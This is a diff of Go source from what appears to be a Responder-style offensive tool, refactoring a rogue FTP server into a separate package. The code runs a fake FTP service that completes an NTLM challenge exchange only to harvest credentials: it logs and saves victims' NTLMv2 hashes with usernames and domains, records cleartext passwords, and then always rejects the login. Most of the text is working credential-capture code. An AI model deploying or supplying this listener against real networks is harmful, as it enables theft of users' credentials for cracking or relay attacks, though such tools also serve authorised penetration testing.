@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"bufio"
@@ -7,29 +7,31 @@ import (
 	"net"
 	"strings"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-func serveFTP(ifaceIP net.IP) {
+func ServeFTP(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:21", ifaceIP))
 	if err != nil {
-		logError("FTP listen :21 — %v (need root?)", err)
+		core.LogError("FTP listen :21 — %v (need root?)", err)
 		return
 	}
-	logInfo("FTP  listening on %s:21", ifaceIP)
+	core.LogInfo("FTP  listening on %s:21", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handleFTP(c)
+		go HandleFTP(c)
 	}
 }
 
-func handleFTP(c net.Conn) {
+func HandleFTP(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(60 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
 
@@ -46,7 +48,6 @@ func handleFTP(c net.Conn) {
 		upper := strings.ToUpper(line)
 
 		if upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM ") {
-			// some clients send the type1 token on the same line
 			var token string
 			if strings.Contains(upper, " ") {
 				parts := strings.SplitN(line, " ", 3)
@@ -56,7 +57,7 @@ func handleFTP(c net.Conn) {
 			}
 
 			if token == "" {
-				send("334 ") // empty 334 = "send your NTLM token"
+				send("334 ")
 				token, err = r.ReadString('\n')
 				if err != nil {
 					return
@@ -69,21 +70,20 @@ func handleFTP(c net.Conn) {
 				send("530 Authentication failed")
 				return
 			}
-			ntlm := FindNTLMSSP(raw)
+			ntlm := core.FindNTLMSSP(raw)
 			if len(ntlm) < 12 {
 				send("530 Authentication failed")
 				return
 			}
-			if ntlmMsgType(ntlm) != 1 {
+			if core.NTLMMsgType(ntlm) != 1 {
 				send("530 Authentication failed")
 				return
 			}
 
-			logVerbose("FTP NTLM Type1 from %s", c.RemoteAddr())
-			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
+			core.LogVerbose("FTP NTLM Type1 from %s", c.RemoteAddr())
+			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))
 
-			// Read type3
 			type3Line, err := r.ReadString('\n')
 			if err != nil {
 				return
@@ -94,17 +94,17 @@ func handleFTP(c net.Conn) {
 				send("530 Authentication failed")
 				return
 			}
-			ntlm3 := FindNTLMSSP(raw3)
-			if len(ntlm3) < 12 || ntlmMsgType(ntlm3) != 3 {
+			ntlm3 := core.FindNTLMSSP(raw3)
+			if len(ntlm3) < 12 || core.NTLMMsgType(ntlm3) != 3 {
 				send("530 Authentication failed")
 				return
 			}
-			hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
+			hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 			if err == nil {
-				logSuccess("[FTP] NTLMv2 captured from %s", c.RemoteAddr())
-				logSuccess("      %s\\%s", domain, user)
-				logSuccess("      %s", hash)
-				saveHash(hash)
+				core.LogSuccess("[FTP] NTLMv2 captured from %s", c.RemoteAddr())
+				core.LogSuccess("      %s\\%s", domain, user)
+				core.LogSuccess("      %s", hash)
+				core.SaveHash(hash)
 			}
 			send("530 Authentication failed")
 			return
@@ -115,7 +115,7 @@ func handleFTP(c net.Conn) {
 			pass := strings.TrimPrefix(line, "PASS ")
 			pass = strings.TrimPrefix(pass, "pass ")
 			if pass != "" {
-				logSuccess("[FTP] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
+				core.LogSuccess("[FTP] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
 			}
 			send("530 Login incorrect")
 			return
@@ -126,11 +126,4 @@ func handleFTP(c net.Conn) {
 			send("530 Please login with USER and PASS or AUTH NTLM")
 		}
 	}
-}
-
-func ntlmMsgType(ntlm []byte) uint32 {
-	if len(ntlm) < 12 {
-		return 0
-	}
-	return uint32(ntlm[8]) | uint32(ntlm[9])<<8 | uint32(ntlm[10])<<16 | uint32(ntlm[11])<<24
 }
